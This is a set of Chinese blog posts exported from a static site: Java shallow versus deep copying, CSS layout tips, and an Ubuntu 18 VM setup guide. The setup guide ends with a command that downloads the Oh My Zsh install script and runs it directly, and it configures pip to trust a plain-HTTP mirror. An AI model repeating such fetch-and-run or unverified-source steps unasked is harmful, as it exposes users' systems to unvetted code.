<p>浅拷贝在成员变量都是值类型(String类不算一般引用类型)时，是完全没问题的。</p>
<p>但是，如果类中存在引用类型的成员变量，那这样浅拷贝是会出现问题的。如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//-----------Demo.java----------------</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    People peo;     <span class="comment">// 类中存在引用类型的成员变量</span></span><br><span class="line"></span><br><span class="line">    Demo(String name, People p) &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.peo = p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 浅拷贝构造函数</span></span><br><span class="line">    Demo(Demo de) &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = de.name;</span><br><span class="line">        <span class="built_in">this</span>.peo = de.peo;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">printInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name);</span><br><span class="line">        peo.printPeopleInfo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">People</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    People(String name, <span class="type">int</span> age) &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    People(People p) &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = p.name;</span><br><span class="line">        <span class="built_in">this</span>.age = p.age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">printPeopleInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;  &quot;</span> + age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//----------------Main.java--------------------</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String argv[])</span> &#123;</span><br><span class="line">        <span class="type">Demo</span> <span class="variable">A</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Demo</span>(<span class="string">&quot;demo1&quot;</span>, <span class="keyword">new</span> <span class="title class_">People</span>(<span class="string">&quot;Tom&quot;</span>, <span class="number">12</span>));</span><br><span class="line">        A.printInfo();     <span class="comment">// 输出：demo1  Tom  12</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Demo</span> <span class="variable">B</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Demo</span>(A); <span class="comment">// B的peo成员变量与A的peo成员变量都指向同一个类</span></span><br><span class="line">        B.name = <span class="string">&quot;demo2&quot;</span>;</span><br><span class="line">        B.peo.name = <span class="string">&quot;ki&quot;</span>;</span><br><span class="line">        B.peo.age = <span class="number">20</span>;</span><br><span class="line">        B.printInfo();     <span class="comment">// 输出：demo2  ki  20</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// A中peo变量指向的对象也被改变了</span></span><br><span class="line">        A.printInfo();     <span class="comment">// 输出：demo1  ki  20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>浅拷贝后，<strong>两个对象的引用类型成员变量指向同一个内存区域</strong>。因此，一个被修改后，另一个也会被影响。</p>
<p>为了避免这种bug的出现，就需要深拷贝了。如果熟悉<code>C</code>语言的话，其实这就是<strong>指针直接赋值</strong>的问题。</p>
<p>深拷贝，是为对象B(拷贝目的对象)的引用成员变量重新申请内存空间，并将对象A(拷贝源对象)的引用成员变量所指向的内容，深拷贝到对象B中引用成员变量所指向的新内存空间。</p>
<p>对上述示例的<code>Demo</code>类的拷贝构造函数做如下修改：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Demo(Demo de) &#123;</span><br><span class="line">    <span class="built_in">this</span>.name = de.name;</span><br><span class="line">    <span class="built_in">this</span>.peo = <span class="keyword">new</span> <span class="title class_">People</span>(de.peo);  <span class="comment">// 新建成员对象，并将被拷贝对象的</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行后，输出变成：</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">demo1</span><br><span class="line">Tom  12</span><br><span class="line">demo2</span><br><span class="line">ki  20</span><br><span class="line">demo1</span><br><span class="line">Tom  12</span><br></pre></td></tr></table></figure>

<p>可以看到，改变<code>B.pe</code>对象中的值后并没有影响到<code>A.pe</code>对象中的值。</p>
<p><code>java</code>中拷贝对象时，应根据适当场景使用对应拷贝方式。</p>
<h2 id="3-内部类"><a href="#3-内部类" class="headerlink" title="3. 内部类"></a>3. 内部类</h2>]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>程序设计语言</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>css实践总结</title>
    <url>/css%E5%AE%9E%E8%B7%B5%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98.html</url>
    <content><![CDATA[<h3 id="1-块元素-如div-独占一行"><a href="#1-块元素-如div-独占一行" class="headerlink" title="1. 块元素(如div)独占一行"></a>1. 块元素(如div)独占一行</h3><h4 id="1-1-问题"><a href="#1-1-问题" class="headerlink" title="1.1. 问题"></a>1.1. 问题</h4><p>当笔者最初接触div盒模型来给界面进行布局时，遇到过这样一个问题：</p>
<span id="more"></span>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>test_div<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-id">#father</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background-color</span>: blue;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border</span>: <span class="number">2px</span> solid black;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-id">#son1</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background-color</span>: yellow;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border</span>: <span class="number">25px</span> solid green;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">padding</span>: <span class="number">25px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">margin</span>: <span class="number">25px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-id">#son2</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background-color</span>: red;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border</span>: <span class="number">25px</span> solid black;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">padding</span>: <span class="number">25px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">margin</span>: <span class="number">25px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;father&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;son1&quot;</span>&gt;</span>这里是盒子test1内的实际内容。盒子:300px 宽，200px 高，25px 内间距，25px 外间距，25px 绿色边框。<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;son2&quot;</span>&gt;</span>这里是盒子test2内的实际内容。盒子:300px 宽，200px 高，25px 内间距，25px 外间距，25px 黑色边框。<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在以上代码中，笔者原本是想让 id为son1的div 和 id为son2的div 两块区域，并排显示在它们的父元素id为father的div区域中，但是结果却是这样的：<br><img src="/css%E5%AE%9E%E8%B7%B5%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/div%E5%B8%83%E5%B1%80%E9%97%AE%E9%A2%98.png" alt="div布局问题"></p>
<h4 id="1-2-原因"><a href="#1-2-原因" class="headerlink" title="1.2. 原因"></a>1.2. 原因</h4><p>显然，两个div子区域的宽并没有撑满整一行，那为什么会第二个div区域会换行呢？这是因为，div元素属于<strong>块元素</strong>，块级元素默认是充满整一行的。因此，两个块级元素是不能并列在同一行的。</p>
<h4 id="1-3-补充"><a href="#1-3-补充" class="headerlink" title="1.3. 补充"></a>1.3. 补充</h4><p>1）HTML的元素(即标签)按布局特性，分为<strong>块元素</strong>和**行内元素(也称内联元素或内嵌元素)**：</p>
<p>块元素</p>
<p>块元素在页面中以区域块的形式出现，其特点是，每个块元素通常都会<strong>独自占据一整行或多整行</strong>，可以对其设置宽度、高度、对齐等属性，常用于网页布局和网页结构的搭建。<br>常见的块元素有<code>&lt;h1&gt;~&lt;h6&gt;、&lt;p&gt;、&lt;div&gt;、&lt;ul&gt;、&lt;ol&gt;、&lt;li&gt;</code>等，其中div是最典型的块元素。</p>
<p>行内元素</p>
<p>行内元素也称内联元素或内嵌元素，其特点是，不必在新的一行开始，同时，也不强迫其他的元素在新的一行显示。一个行内元素通常会和它前后的其他行内元素显示在同一行中，它们不占有独立的区域，仅仅靠自身的字体大小和图像尺寸来支撑结构，一般不可以设置宽度、高度、对齐等属性，常用于控制页面中文本的样式。<br>常见的行内元素有<code>&lt;strong&gt;、&lt;b&gt;、&lt;em&gt;、&lt;i&gt;、&lt;del&gt;、&lt;s&gt;、&lt;ins&gt;、&lt;u&gt;、&lt;a&gt;、&lt;span&gt;</code>等，其中span是最典型的行内元素。</p>
<p>2）而对于块元素和行内元素之间，是可以用css中的display属性来转换的。display属性常用的属性值及含义如下：</p>
<ul>
<li>inline：此元素将显示为行内元素（行内元素默认的display属性值）。</li>
<li>block：此元素将显示为块元素（块元素默认的display属性值）。</li>
<li>inline-block：此元素将显示为<strong>行内块元素</strong>，可以对其设置宽高和对齐等属性，但是该元素不会独占一行。</li>
<li>none：此元素将被隐藏，不显示，也不占用页面空间，相当于该元素不存在。</li>
</ul>
<h4 id="1-4-解决"><a href="#1-4-解决" class="headerlink" title="1.4. 解决"></a>1.4. 解决</h4><p>因此，对于这个问题，我们只需要对 #son1 和 #son2 的css属性进行以下修改就能解决：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#son1</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: yellow;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">25px</span> solid green;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">25px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">25px</span>;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;      <span class="comment">/*让该元素变成行内块级元素*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#son2</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: red;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">25px</span> solid black;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">25px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">25px</span>;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;      <span class="comment">/*让该元素变成行内块级元素*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改后页面变为如下：<br><img src="/css%E5%AE%9E%E8%B7%B5%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/div%E5%B8%83%E5%B1%80%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3.png" alt="div布局问题解决"></p>
<h3 id="2-文本过长时显示省略号"><a href="#2-文本过长时显示省略号" class="headerlink" title="2. 文本过长时显示省略号"></a>2. 文本过长时显示省略号</h3><p>只需要对包含该文本的元素的css属性进行如下设置即可：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.text</span> &#123;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;           <span class="comment">/*超过宽度的文本隐藏*/</span></span><br><span class="line">    <span class="attribute">white-space</span>: nowrap;        <span class="comment">/*规定段落中的文本不进行换行*/</span></span><br><span class="line">    <span class="attribute">text-overflow</span>: ellipsis;    <span class="comment">/*当元素内文本溢出时显示省略标记（...）*/</span></span><br><span class="line">    <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-将矩形图片变为圆形"><a href="#3-将矩形图片变为圆形" class="headerlink" title="3. 将矩形图片变为圆形"></a>3. 将矩形图片变为圆形</h3><p>css代码如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.round_icon</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">34px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">34px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>html代码如下：<br><code>&lt;img src=&quot;../assets/userImg.jpg&quot; class=&quot;round_icon&quot; alt=&quot;&quot;&gt;</code></p>
<p>若图片为长方形，则可以如下修改：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;width:2.8rem;height:2.8rem;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">:src</span>=<span class="string">&quot;user.avatarImg&quot;</span> <span class="attr">style</span>=<span class="string">&quot;border-radius:50%;width:100%;height:100%;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="4-图片-img元素-自适应区域-div元素-大小"><a href="#4-图片-img元素-自适应区域-div元素-大小" class="headerlink" title="4. 图片(img元素)自适应区域(div元素)大小"></a>4. 图片(img元素)自适应区域(div元素)大小</h3><p>css代码如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">img</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: auto;</span><br><span class="line">  <span class="attribute">height</span>: auto;</span><br><span class="line">  <span class="attribute">max-width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">max-height</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>html代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:60px;height:60px&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/img1.jpg&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>相关博客：<a href="https://www.lisa33xiaoq.net/359.html">https://www.lisa33xiaoq.net/359.html</a></p>
<h3 id="5-div中文字太多自动换行"><a href="#5-div中文字太多自动换行" class="headerlink" title="5. div中文字太多自动换行"></a>5. div中文字太多自动换行</h3><p>设置div样式为：<code>word-break:break-all;word-wrap:break-all;</code> 即可。</p>
<p>示例如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;word-break:break-all;word-wrap:break-all;&quot;</span>&gt;</span></span><br><span class="line">    &#123;&#123;message&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

为vue中语法，不必理会。

<h3 id="6-字体大小适应屏幕"><a href="#6-字体大小适应屏幕" class="headerlink" title="6. 字体大小适应屏幕"></a>6. 字体大小适应屏幕</h3><p>css3提供了一些与当前viewpoint相关的元素，vw，vh等。</p>
<figure class="highlight d"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>vw = <span class="number">1</span>% of viewport width</span><br><span class="line"><span class="number">1</span>vh = <span class="number">1</span>% of viewport height</span><br></pre></td></tr></table></figure>

<p>兼容性：chrome 20+&#x2F; safari 6+&#x2F; IE 10+ &#x2F; FF 19+ &#x2F; IOS 6+</p>
<p>使用：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;font-size:4vw&quot;</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>慎用！</p>
<h3 id="7-flex布局"><a href="#7-flex布局" class="headerlink" title="7. flex布局"></a>7. flex布局</h3><p>flex，CSS3提出的新概念，可以极其方便地用于布局，易学好用。</p>
<p>轻松实现子元素水平、垂直居中，换行包裹等布局。</p>
<p>使用说明：<a href="https://www.cnblogs.com/qcloud1001/p/9848619.html">https://www.cnblogs.com/qcloud1001/p/9848619.html</a></p>
<p>在线演示网站：<a href="https://www.html.cn/demo/flexbox-playground/">https://www.html.cn/demo/flexbox-playground/</a></p>
<h3 id="8-电脑、手机端自适应"><a href="#8-电脑、手机端自适应" class="headerlink" title="8. 电脑、手机端自适应"></a>8. 电脑、手机端自适应</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@media</span> (<span class="attribute">min-width</span>: <span class="number">900px</span>) &#123;</span><br><span class="line">  <span class="selector-class">.home-main</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">1000px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">20px</span> auto;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>@media(min-width: 900px)</code> 可以使其中作用的css样式，只适用于屏幕宽度大于<code>900px</code>的设备。</p>
<p>同理，<code>@media (max-width: 900px)</code> 使css样式只适用于小于<code>900px</code>的设备。</p>
]]></content>
      <categories>
        <category>开发</category>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>VM 虚拟机安装及配置 Ubuntu18</title>
    <url>/VM%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85Ubuntu%E5%8F%8A%E8%BF%9B%E8%A1%8C%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE.html</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近总是将虚拟机Ubuntu进行卸载、重装、卸载、重装。。。。</p>
<p>每次重装后，都要上网查找Ubuntu各种环境、工具的配置方案。实在太过繁琐，于是便打算自己进行总结一番，以便后用。</p>
<p>此前都是Ubuntu 16系统，这次则使用<code>Ubuntu 18.04</code>系统(不得不说，实在是很漂亮了)。并选择最小化安装。</p>
<span id="more"></span>

<h2 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h2><h3 id="1-修改系统语言为English"><a href="#1-修改系统语言为English" class="headerlink" title="1. 修改系统语言为English"></a>1. 修改系统语言为English</h3><p>在系统中 <code>设置 - 地区和语言</code> 中进行修改。需要重启。</p>
<h3 id="2-设置网络"><a href="#2-设置网络" class="headerlink" title="2. 设置网络"></a>2. 设置网络</h3><p>参考：<a href="https://blog.csdn.net/yaoqinzhou1943/article/details/14127671">https://blog.csdn.net/yaoqinzhou1943/article/details/14127671</a></p>
<p>（未学过计算机网络的，可能对网络设置难以理解。）</p>
<p>不同虚拟机软件由不同的网络配置方式。在 Vmware 中，有三种网络设置：</p>
<ul>
<li>NAT：相当于创建了一台虚拟的NAT路由器，对外是宿主机的IP地址，对内是一个虚拟局域网，包括所有的虚拟机和宿主机。</li>
<li>桥接：通过一个虚拟网桥跟宿主机相连，相当于把虚拟机接入宿主机所在的网络，IP地址由宿主机所在的网络分配，与宿主机地位相等。</li>
<li>Host-only：在所有虚拟机与宿主之间创建一个虚拟局域网，但是不能访问外网，相当于去掉了NAT模式中的路由器。</li>
</ul>
<p>在 Vmware 中，建议使用 NAT ，不仅方便还可以设置虚拟机为固定IP地址。</p>
<p>Ubuntu18 固定IP地址配置方法见：<a href="https://blog.csdn.net/AV_woaijava/article/details/90050154">https://blog.csdn.net/AV_woaijava&#x2F;article&#x2F;details&#x2F;90050154</a></p>
<h3 id="3-设置root用户密码"><a href="#3-设置root用户密码" class="headerlink" title="3. 设置root用户密码"></a>3. 设置root用户密码</h3><p>命令行输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure>

<p>意思是为<code>root</code>用户添加密码。</p>
<p>然后，输入两次密码后即可。</p>
<h3 id="4-更换apt源"><a href="#4-更换apt源" class="headerlink" title="4. 更换apt源"></a>4. 更换apt源</h3><p>先下载<code>vim</code>：<code>sudo apt-get install vim</code>。(没换源，网速是真的慢)</p>
<p>然后：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/apt</span><br><span class="line">sudo <span class="built_in">cp</span> sources.list sources.list.bak</span><br><span class="line">sudo vim sources.list</span><br></pre></td></tr></table></figure>

<p>修改<code>sources.list</code>文件，将其中内容换成以下国内源：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##中科大源</span><br><span class="line"></span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span><br></pre></td></tr></table></figure>

<p>更多<code>Ubuntu 18</code>的<code>apt</code>国内源见<a href="https://blog.csdn.net/xiangxianghehe/article/details/80112149">他人博客</a>。</p>
<p>修改完成后，更新<code>apt</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure>

<p>(很多<code>apt</code>安装的问题，可能都是因为源没有<strong>配置好</strong>)</p>
<h3 id="5-安装主要工具"><a href="#5-安装主要工具" class="headerlink" title="5. 安装主要工具"></a>5. 安装主要工具</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install gdb man git -y</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install openssh-server</span><br></pre></td></tr></table></figure>

<p>安装<code>openssh-server</code>可能会报错(源的问题)，提示需要一些依赖工具，如：<code>openssh-client</code>、<code>openssh-sftp-server</code>等。或许，还需要版本要求。你可以通过如下方式安装指定工具的版本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install openssh-client=x.x.x</span><br></pre></td></tr></table></figure>

<p>安装完<code>openssh-client</code>、<code>openssh-sftp-server</code>等依赖工具后，<code>openssh-server</code>应该就可以成功安装了。</p>
<p>可以用主机通过<code>ssh</code>，连接虚拟机<code>仅主机模式</code>网卡(可能是<code>ens38</code>)对应的<code>ip</code>地址。</p>
<p>(安装<code>openssh-server</code>，是为了让主机能通过<code>ssh</code>连接到虚拟机。)</p>
<h3 id="6-配置vim"><a href="#6-配置vim" class="headerlink" title="6. 配置vim"></a>6. 配置vim</h3><p>见博客<a href="./vim%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html">vim学习笔记</a></p>
<h3 id="7-配置python环境"><a href="#7-配置python环境" class="headerlink" title="7. 配置python环境"></a>7. 配置python环境</h3><h4 id="7-1-安装python、pip、pip3"><a href="#7-1-安装python、pip、pip3" class="headerlink" title="7.1. 安装python、pip、pip3"></a>7.1. 安装<code>python</code>、<code>pip</code>、<code>pip3</code></h4><p><code>ubuntu 18</code>系统自带<code>python3.6</code>，没有<code>python2</code>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install python       <span class="comment"># python2</span></span><br><span class="line">sudo apt install python-pip   <span class="comment"># python2的pip</span></span><br><span class="line">sudo apt install python3-pip  <span class="comment"># python3的pip</span></span><br></pre></td></tr></table></figure>

<p>(如果出现各种依赖问题，可能是<code>apt</code>源配置有问题)</p>
<h4 id="7-2-pip换源和升级"><a href="#7-2-pip换源和升级" class="headerlink" title="7.2. pip换源和升级"></a>7.2. pip换源和升级</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span>  ~/.pip</span><br><span class="line">vim  ~/.pip/pip.conf</span><br></pre></td></tr></table></figure>

<p>在<code>pip.conf</code>中添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = http://mirrors.aliyun.com/pypi/simple/</span><br><span class="line"></span><br><span class="line">[install]</span><br><span class="line">trusted-host=mirrors.aliyun.com</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo pip install --upgrade pip</span><br></pre></td></tr></table></figure>

<p>升级<code>pip</code>。</p>
<h4 id="7-3-安装python虚拟环境"><a href="#7-3-安装python虚拟环境" class="headerlink" title="7.3. 安装python虚拟环境"></a>7.3. 安装python虚拟环境</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install virtualenv</span><br></pre></td></tr></table></figure>

<p><code>pip</code>指向python2，会安装到python2中。</p>
<p><code>virtualenv</code>的具体使用方法见<a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001432712108300322c61f256c74803b43bfd65c6f8d0d0000">virtualenv</a>。</p>
<h3 id="8-安装pwn环境"><a href="#8-安装pwn环境" class="headerlink" title="8. 安装pwn环境"></a>8. 安装pwn环境</h3><h4 id="8-1-pwntools"><a href="#8-1-pwntools" class="headerlink" title="8.1. pwntools"></a>8.1. pwntools</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure>

<p>需要用python2的pip安装</p>
<h3 id="9-美化命令行"><a href="#9-美化命令行" class="headerlink" title="9. 美化命令行"></a>9. 美化命令行</h3><p>美化命令行项目：<a href="https://github.com/ohmyzsh/ohmyzsh">ohmyzsh</a></p>
<p>执行命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install zsh</span><br><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>

